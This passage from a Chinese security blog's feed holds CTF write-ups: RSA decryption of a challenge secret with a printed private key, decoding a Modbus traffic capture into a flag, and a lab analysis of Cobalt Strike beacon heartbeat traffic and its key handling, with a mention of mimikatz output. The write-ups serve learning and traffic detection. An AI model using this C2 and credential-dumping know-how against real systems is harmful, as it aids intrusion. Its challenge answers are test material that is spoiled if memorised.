&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-----BEGIN PRIVATE KEY-----&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC1YaMyRuhD9Pu5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;w6GNhfYTQ0Vo/0OjZPKyDS3viCZIuXUsUn/vQxMJPWlCQq7rRv2c7+z8PTxeirV7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1fPT/sFxgxHbjZeFDRCvU7Pc4ZknT8rTymGWR9WB6XEi8s06gWQegxOKgq7smDJs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Qow+7OGes1Xm8HxgeDjjghzeN2dS75kswo+HF6hzZVKiJGoju/jyp2hqdjuMYySv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BHzlLoH5r1Yrdg/hEIOaua2h7s5p5ybJ+8aIqTEFz5Q/FuM4z9LE0O8ysJxo4WRV&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+cbtWCD17kGIjRxHW5tTTszqrwHMISVyZq+5Ib1K7DGE3a/Ek/weYp5Fh8bX8LbH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RSwBsopXAgMBAAECggEADw3xDSm8enN5dzQpEwWE5JlnR+0z8Hpe+G9GmkR7JPsb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oheg3bt7937c3y6ItSd5wk5ZpZ/xhElQAdzCtZxF8wV1dHsekeEBOwQgABvLaeti&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;As0f52jD7FnzVXrAlPQLWsr3Ur5BBYsmWDz3xftESLdK0HWyZRFla2Cvw7PmhAgS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CDYvj5S0qk0h7KrNGJMfM8o+j7lE3ZKv5pTTVQ+/GUwF0q+Ujk75Zg3WMfGQQVOT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nM0kOa970Yfb7V2UHcQn9HCxHY0wc+/PK4jtn2h4htTrNBBTa4B6zTDY8sfYg0XB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+M2H57We0r7azWmdeVAM3woocqbNYMUFUB/PVR36CQKBgQDD5OxBcMepIDnWXb0c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ict5/O67VhkWUb64vA695P9luBtCKxfnhlSnPjPt3olCy5KInB02MnNJMHV4haqY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gtxb+1GeXK3pJo837s7w7bnVAE3eP3OmYHk4aq8LMtxacd8WZ0UyUH16+4hKbrh+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JowSwZvLixWaJq0XaSIOkmO83wKBgQDtCMMjMzhiNEhNDHtc+SlVzqlXKtIp61ag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pavufiUUEKyRoG8i1GoIIPn7u2hEBF8Rm3euuWLl1SHAjWswNEUJnp2rO5sFGJBK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sgpIyxFkiSYFoXWKVd0r7k/KNPk1ShpHZhSJqEsYqmDjbTFFVxUCj3xerfZlqLQT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dzdOnoVpiQKBgQCG3RDmEL30qtIGyixK/HbQehjlcmX9HrQePKIti/1kyzZA/KgN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZkbbiRB5QA7hpIMyd8AIsvz5s1n8apHC/CMfVEuhqg61CC3rhQaFijS49uelDawS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LDLoa1ItdIuN3P2IT/qspAtvYsI29Dkh6Gng89fNbuilYuEhz+h5fcEaowKBgBlc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aqSFgm7fcSztPPXBou6PYgb1ie76QxaFI1QtIwJ2lkAujjWHzKB6BsUsVAeTACj+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HVwQcchteWMEvoc10H0q/2umwPtWmXmkev023PGIywynLdBTR4q/wMG90TwmZZFm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FqRz4TUOZbdvo2nr20+e0ou+yTIvTrUWeFBtHZEhAoGACualPMp1+DKOnGRKqpBA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c/W/ObkBBgQsV11k+wy1AZ0SVUjY0DkEKdKAMxQ6v0+ERCrbgVOux0xGR7MF7RGY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;OwuVNDyCUT/gbqkxU3aUmT9oa+kbnxHtdUsbqeziEJ9xMLWlDygVfv4ae+InKbS0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MnZAAXUNDQIu5dxYCGPlrfA=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----END PRIVATE KEY-----&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;secret.txt：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bFBkNlE3SDF1ZjRTTkVLSDRJRTFLZzJpREZrMERCaEp3Q0JzZEkyV2h6T0dhcDA4a2RQWVFGcjZhcFN2WmlUSHZqaVgydG1VbEk5aTJ3aC8xZ2h3SUs5N1BiSERxMStTeEUxbnI0Nm0wUC9DMXpna0IyMit1M1YycTE5SU9BYXRuYXNya1BESkxQaW0reG54N3QxTnlBN1ZKTHdzUk5DUG9xRWdMbWZRQnd1elBCalhDdHVmUVkva0FpaDdLdTRPblVXa0pYRHlkSWxPTnplamVJK21RRy84VVFITTRQYnNjam9vdlJ2ZWMrYUpSMWxqODAzMXFjbSsyWnZJZFIrZElEYkNXMmtZam1OYm1XK0w2UG5LQ2Uvc3VKSjRBZVI0Sm1NbGVRRVJMemltZ1huV25GUnY4WnppVXNyS1lVVXRNb2w5V1hKazg4VjdRSE1yL0wzRkVnPT=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在线网站分解私钥之后使用脚本进行解密&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5oaWVuY29kZS5jb20vcHJpdl9hc3lzLmh0bWw=&#34;&gt; http://www.hiencode.com/priv_asys.html&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from base64 import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from Crypto.Util.number import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = 22897280037618974619340846752999631827813818170571516093336584434775675187911179854957453351224025346333112420553633170369593452474468994360875843672122891197414738125554960475847811974999960386639323750005461211814555798539418918028176295505664790681416998283240971057298698033755526560483652785000652359544503171667435140921558876010825999934580334820605796539553023241585105667208475754931859753698830927470458071231845332752109628151991221800856650720139024371213297529175153974325381443615718839995260607889829031612063951205623842853683671813857941916059109130631113924524369318816564540461224076941697301514839&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d = 1900449437182483367287250498389329650844458305061625673889624960449246764188822540260327257945635074406502662795085030291673460560215971051863590821284350316131917360177551726633415829806251194334873453746047366551189042314344098823782976935213141109778716788404859271345595128776312414754273606115797923459124942020459641900581560513546440430423068817960532088772269553080009423772016559433423351574011538603757410467222208992113233166851765907432319285253284046549512288457264075133865582854163144527301952940757041488705998905401183446222196348514190895895140391122398911374890210750891922002358312637449887414793&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ksecret = b&amp;quot;lPd6Q7H1uf4SNEKH4IE1Kg2iDFk0DBhJwCBsdI2WhzOGap08kdPYQFr6apSvZiTHvjiX2tmUlI9i2wh/1ghwIK97PbHDq1+SxE1nr46m0P/C1zgkB22+u3V2q19IOAatnasrkPDJLPim+xnx7t1NyA7VJLwsRNCPoqEgLmfQBwuzPBjXCtufQY/kAih7Ku4OnUWkJXDydIlONzejeI+mQG/8UQHM4PbscjoovRvec+aJR1lj8031qcm+2ZvIdR+dIDbCW2kYjmNbmW+L6PnKCe/suJJ4AeR4JmMleQERLzimgXnWnFRv8ZziUsrKYUUtMol9WXJk88V7QHMr/L3FEg==&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c = bytes_to_long(b64decode(ksecret))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(long_to_bytes(pow(c,d,n)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8ysy8AOcf2RsK43v.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到密码：b4ddfa11-4c91-48da-8e57-37d86a3f40ee&lt;/p&gt;
&lt;p&gt;解压压缩包得到 1.txt 文件，是个 mimikatz 爆破结果，在里面找到 username 为 flag&lt;/p&gt;
&lt;p&gt;password 便是 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vojec67wEkfyZ2AZ.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/Modbus%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</guid>
            <title>Modbus协议流量分析</title>
            <link>https://nnnpc.github.io/2024/04/16/Modbus%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:19 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记一次 Modbus 协议流量分析&lt;/p&gt;
&lt;p&gt;首先协议分级能够发现是 Modbus/TCP 的类型的流量&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nogwwyfVtbDVq7IG.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;同时这也是题目中考的最多的 Modbus 协议流量&lt;/p&gt;
&lt;p&gt;常见的功能码：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1：读线圈&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2：读离散输入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3：读保持&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4：读输入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5：写单个线圈&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6：写单个保持&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15：写多个线圈&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16：写多个保持&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先先过滤一下 modbus 协议的流量&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126151613792.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;翻了翻，发现该流量包中只有两种功能码，一个是 3（读保持）一个是 6（写单个保持）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126152334120.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先先将功能码 6 且选中进行过滤，并将 data 都提取出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126152810732.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;转码也并没有什么发现&lt;/p&gt;
&lt;p&gt;接下来同样的方法过滤功能码 3&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126153115071.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现每次的回复包都有一组可疑的数据，并且随着包的标号往下看，从每一组的第一个数开始依次轮换了三次，也就是有四组数据，把他们都提取出来&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;71 71 81 63 79 64 43 40 41 41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112 65 35 86 83 101 98 77 96 91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74 93 88 71 90 85 68 73 68 85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90 93 0 1 2 3 4 3 2 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;直接转 ascii 码并不正确，但是由于数据可疑并且长度差不多，我们计算一下标头数据和 flag 头字母 ascii 码的偏移量，发现都是一样的&lt;/p&gt;
&lt;p&gt;利用脚本加上偏移转换成 ascii 码得到 flag&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;c =[71,71,81,63,79,64,43,40,41,41,112,65,35,86,83,101,98,77,96,91,74,93,88,71,90,85,68,73,68,85,90,93,0,1,2,3,4,3,2,1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset = ord(&amp;#x27;H&amp;#x27;) - c[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for i in range(0, len(c)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print(chr(c[i]+i+offset),end=&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HITCTF2023&amp;#123;M0dbus_so_so_so_easy&amp;#125;!#%&amp;#x27;))))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</guid>
            <title>CS流量浅析</title>
            <link>https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/</link>
            <category>流量</category>
            <pubDate>Tue, 16 Apr 2024 13:58:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;cs的工作流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs的工作流程&#34;&gt;#&lt;/a&gt; cs 的工作流程&lt;/h1&gt;
&lt;p&gt;1、被控机先向 TeamServer 发送心跳包，包中包含了主机信息和协商密钥等信息，而这些信息都被使用 RSA 公钥进行了加密放在了 Cookie 中&lt;/p&gt;
&lt;p&gt;2、server 端第一次心跳之后进入睡眠，并用私钥将数据包解开获得主机信息和协商密钥，基于协商密钥会生成新的 AES&lt;br&gt;
key 和 HMAC key&lt;/p&gt;
&lt;p&gt;3、睡眠时间过后，会再一次发送心跳包询问是否有新的命令，当有新的命令出现时会将其数据包加密后发送，而命令会作为该回应包的 body 发送&lt;/p&gt;
&lt;p&gt;4、被控端在接收到数据包之后进行解密获取命令，再将命令执行的结果加密后返回给 TeamServer，该次传输使用 POST 请求发送回 TeamServer&lt;/p&gt;
&lt;p&gt;5、TeamServer 解密之后能看到明文的回显&lt;/p&gt;
&lt;p&gt;6（不同情况）、当 3 中所说的睡眠时间过了之后，再次发送心跳包却没有收到新的指令信息，这时候 teamserver 就会返回空包&lt;/p&gt;
&lt;p&gt;ps：还需要知道的是，Private Key 和 Public&lt;br&gt;
Key 是特定的，并且保存在.cobaltstrike.beacon_keys 中，也就是说.cobaltstrike.beacon_keys 是特定的，对于一个固定的 CS，经过首次使用 CS 软件，就会生成一组固定的私钥和公钥，而这也是通信的关键。现在很多 CS 的私钥已经披露了，也就意味着如果抓到攻击者的 CS 流量，能够精确找到对应的私钥，那么解密流量包也是有可能的，但是前提不是魔改的 CS&lt;/p&gt;
&lt;p&gt;用一副流程图来解释下 CS 的通信流程（来自 Chris 师傅文章流程图的魔改）：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IAq4qZHApAwrtoYW.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;信标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信标&#34;&gt;#&lt;/a&gt; 信标&lt;/h1&gt;
&lt;p&gt;接下来来说说信标，信标就是 cs 中的 beacon，对于 windwos 操作系统来说，就是 cs 生成需要执行的 beacon.exe 文件，同时因为信标由 teamserver 端进行生成，因此其中包含很多 teamserver 端的信息，更是可以通过静态和动态的信标去解密 cs 的通信流量，这些后文中都会提到&lt;/p&gt;
&lt;h1 id=&#34;心跳包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#心跳包&#34;&gt;#&lt;/a&gt; 心跳包&lt;/h1&gt;
&lt;p&gt;接下来浅浅的解释一下心跳包的作用与含义。利用心跳包的这种方式，定时向 TeamServer 进行发包询问，无命令就返回空包，有命令加密后进行回包，有效避免了进行长时间不间断的数据传输和通信而被防御设备检测到异常流量采取措施，sleep 的时间一般是 60s。从正向来看，当 sleep 的时间默认为 60s 时，我们发送命令获得回显的时间有长有短，这就是原因，越接近睡眠时间结束发送的命令，获得的回显时间也越快，只有当心跳包发送进行询问，发现有新的指令，这个时候才会进行传输通信。这里顺便提一嘴，指令是指 TeamServer 端发送的任意动作指令，不是单单指命令行的操作指令&lt;/p&gt;
&lt;p&gt;当然，个人看来，从防守方来讲，既然知道了心跳包的的存在，一样可以通过改写规则来实现检测和拦截，一般 CS 的 sleep 时间设定在 6-9s。前段时间和某大厂做流量检测产品的大手子师傅聊了天，知道了其实做流量检测这种安全产品，主要就是想方法让它越做越精准，而不是只会存在一大堆不准确的误报，费时费力不说，客户看了也头疼。例如某一个渗透工具，它可主要分为三次通信，第一次连接，第二次测试，第三次进行执行，这时候没有必要第一次在尝试连接的时候便进行告警，很多的业务流量可能也是相似的，如果这就直接告警那会出现铺天盖地的误报。一般第一次和第二次通信都抓他们的特征包并且做好记录，当第三次出现时，再发出告警并且做一些拦截防护措施，这样既避免了误报，也实现了成功告警拦截&lt;/p&gt;
&lt;h1 id=&#34;抓包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#抓包&#34;&gt;#&lt;/a&gt; 抓包&lt;/h1&gt;
&lt;p&gt;接下来抓取流量进行分析&lt;/p&gt;
&lt;p&gt;攻击机：192.168.40.144&lt;/p&gt;
&lt;p&gt;靶机：192.168.40.131&lt;/p&gt;
&lt;p&gt;首先在攻击机上开启 cs 服务，设置好监听后生成 windows 木马，将生成的 beacon.exe 放入 windows 靶机上，开始抓取流量&lt;/p&gt;
&lt;h2 id=&#34;第一次心跳包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一次心跳包&#34;&gt;#&lt;/a&gt; 第一次心跳包&lt;/h2&gt;
&lt;p&gt;双击 beacon.exe 之后暂停进行分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hIxnPjmgJyiGznjw.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这时候我们的 TeamServer 显示靶机已经受害，被上线了&lt;/p&gt;
&lt;p&gt;按照 CS 的工作流程，在 TeamServer 显示出主机之前，需要经过：被控机子的第一次心跳包；TeamServer 接收进入睡眠，并且解密数据包获取主机信息，生成新的 AES&lt;br&gt;
key 和 HMAC key 两个大致的步骤，接下来看看流量包&lt;/p&gt;
&lt;p&gt;过滤一下 http&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bscAdYSqGym9AHrC.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到一个心跳包一个回包，追踪一下看看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WIzbHq6IgpHti5BR.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 get 请求发送的第一个心跳包，cookie 记录了公钥加密后的主机信息和协商密钥，向 TeamServer 发包&lt;/p&gt;
